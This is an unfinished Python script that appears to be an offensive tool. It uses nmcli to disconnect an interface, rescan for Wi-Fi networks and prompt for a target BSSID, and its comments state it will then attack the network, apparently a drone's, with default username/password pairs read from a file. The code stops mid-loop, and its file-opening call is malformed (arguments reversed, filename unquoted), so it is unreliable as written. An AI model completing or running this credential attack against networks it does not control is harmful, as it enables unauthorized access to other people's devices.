#!/usr/bin/python3
# wifi_discovery.py asks for a network interface, then utilizes that for discovering/rediscovering networks in the area. Once a network's BSSID is selected, it will attack the network with default credentials obtained from elsewhere. Python3 and NetworkManager/nmcli required.



import subprocess, re


# Detect network card/list interfaces and disconnect if needed
netiface = input("List interface: ")
print(netiface)
yn = subprocess.Popen(['sudo','nmcli','c'],stdout=subprocess.PIPE)
ynout = yn.stdout.read().decode('utf-8')
if netiface in ynout:
    subprocess.run(['sudo','nmcli','d','disconnect', netiface])


# list all interfaces and choose which you want
subprocess.run(['sudo', 'nmcli', 'd', 'wifi', 'rescan'])
netlist = subprocess.Popen(['sudo', 'nmcli', 'd', 'wifi'],stdout=subprocess.PIPE)
output = netlist.stdout.read().decode('utf-8')
print(output)
bssid = input('Input bssid: ')


# Connect to drone using default creds
# import "default_creds" from elsewhere, user/pass delimited by single space

"""

username pass
username pass
username pass

"""

for line in open('r',default_creds.txt):
    
